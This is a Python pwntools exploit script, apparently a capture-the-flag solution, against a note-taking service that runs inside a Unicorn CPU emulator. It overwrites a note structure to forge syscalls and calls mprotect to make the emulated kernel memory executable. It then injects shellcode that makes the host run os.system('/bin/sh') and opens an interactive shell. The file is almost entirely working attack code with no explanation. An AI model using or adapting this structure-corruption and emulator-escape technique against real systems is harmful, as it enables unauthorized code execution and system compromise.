from pwn import *
from unicorn import *
from unicorn.x86_const import *

def get_prompt():
	return p.recvuntil("3. Exit")

def edit_note(idx,data):
	p.sendline("1")
	p.recvuntil("Note id: ")
	p.sendline(str(idx))
	p.recvuntil("Contents: ")
	p.send(data)
	get_prompt()

def show_note(idx,interact=False):
	p.sendline("2")
	p.recvuntil("Note id: ")
	p.sendline(str(idx))
	if interact:
		return
	else:
		get_prompt()

'''
00000000 id
00000008 note
00000010 size
00000018 serial
00000020 show
'''

context.os = 'linux'
context.arch = 'amd64'
KERNEL_ADDRESS = 0xFFFFFFFF81000000
MAPPING_SIZE = 0x100000

def make_syscall(rax,rdi,rsi,rdx,interact=False):
	syscall = 0x4000338
	fake_struct = p64(rax)+p64(rdi)+p64(rsi)+p64(rdx)+p64(syscall)
	edit_note(9,"A"*8+fake_struct+"\n")
	show_note(0,interact)

def jump_to_address(addr,rax=0,rdi=0,rsi=0,rdx=0,interact=False):
	fake_struct = p64(rax)+p64(rdi)+p64(rsi)+p64(rdx)+p64(addr)
	edit_note(9,"A"*8+fake_struct+"\n")
	show_note(0,interact)

p = process("./start.py")
get_prompt()
for i in range(9):
	edit_note(i,"A\n")


cmd = '__import__("os").system("/bin/sh")'
dis = shellcraft.amd64.pushstr(cmd)
dis += "\nmov rax,7\n"
dis += "mov rdi,rsp\n"
dis += "mov rdx,%d\n"%len(cmd)
dis += "int 0x70"

shellcode = asm(dis)

#mprotect syscall
rax,rdi,rsi,rdx,addr = 10,KERNEL_ADDRESS,MAPPING_SIZE,UC_PROT_READ|UC_PROT_WRITE|UC_PROT_EXEC,0x4000338
fake_struct = p64(rax)+p64(rdi)+p64(rsi)+p64(rdx)+p64(addr)
make_syscall(0,0,0x4100380,len(fake_struct),interact=True)
p.send(fake_struct)
show_note(0)


make_syscall(0,0,0xffffffff81000106,len(shellcode),interact=True)
p.send(shellcode)

make_syscall(2,0,0,0,interact=True)
p.interactive()

